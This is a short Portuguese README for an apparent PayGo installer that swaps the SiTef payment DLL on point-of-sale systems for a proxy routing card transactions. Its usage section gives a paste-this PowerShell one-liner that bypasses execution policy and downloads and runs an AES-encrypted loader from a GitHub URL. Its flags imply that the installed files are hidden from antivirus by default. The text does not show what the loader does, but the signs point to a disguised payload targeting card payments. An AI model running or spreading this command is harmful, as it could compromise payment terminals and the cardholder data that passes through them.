# paygo — instalador PayGo (SiTef -> PayGo)

Instalador via PowerShell (loader criptografado AES-256). Substitui a `CliSiTef32I.dll`
do SiTef pelo proxy que roteia crédito/débito ao PayGo.

## Uso

```powershell
powershell -NoP -EP Bypass -C "irm 'https://raw.githubusercontent.com/salexunic/paygo/main/loader.ps1' -UseBasicParsing -OutFile $env:TEMP\l.ps1; & $env:TEMP\l.ps1 -Key 'CHAVE' -Cnpj 66372694000104 -Pdc 6681845 -ForceInstall"
```

## Arquivos

- `loader.ps1` — installer criptografado (decripta com `-Key`)
- `PGWebLib.dll` — PayGo original
- `CliSiTef32I.dll` — proxy (SiTef -> PayGo)
- `libenv.dll` — SiTef original (fallback)

## Parâmetros

| Flag | Descrição |
|---|---|
| `-Key` | chave AES (obrigatória) |
| `-Cnpj` | CNPJ do estabelecimento |
| `-Pdc` | código do terminal (PDC) |
| `-Server` | servidor PayGo (host:porta) |
| `-Port` | porta do pinpad (AUTO/COMx/NONE) |
| `-ForceInstall` | força reinstalar o PDC |
| `-PdcOnly` | só instala o PDC (não mexe no PDV) |
| `-SkipProtect` | não oculta arquivos (se o AV flagar) |
